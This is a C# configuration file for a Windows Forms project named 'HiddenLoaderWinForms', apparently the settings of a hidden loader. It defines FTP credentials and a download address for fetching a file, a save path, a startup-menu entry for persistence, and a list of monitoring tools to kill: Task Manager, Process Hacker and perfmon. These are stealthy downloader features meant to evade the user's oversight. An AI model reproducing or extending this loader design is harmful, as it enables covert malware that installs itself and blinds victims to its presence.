using System;

namespace HiddenLoaderWinForms
{
    public static class Config
    {
        #region FTP_Settings
        public const string FtpUserName = "tent"; //ftp user name
        public const string FtpUserPassword = "123"; //ftp user password
        public const string DownloadFtpAddress = "ftp://127.0.0.1/test_dir/" + FileName; //ftp address + file name with file extension
        #endregion

        public const string FileName = "test.txt"; //file name + extension
        
        public static string DownloadPathDir = Environment.CurrentDirectory + @"\" + FileName; //local path where to save downloaded file + file name with file extension
        
        public const string StartupProcessName = "github.com/tentrun"; //name of process in startup menu

        #region ProcessKiller_Settings
        public static readonly string[] ProcessNames = new string[]{"Taskmgr", "ProcessHacker", "perfmon"}; //names of process what need to kill
        #endregion
    }
}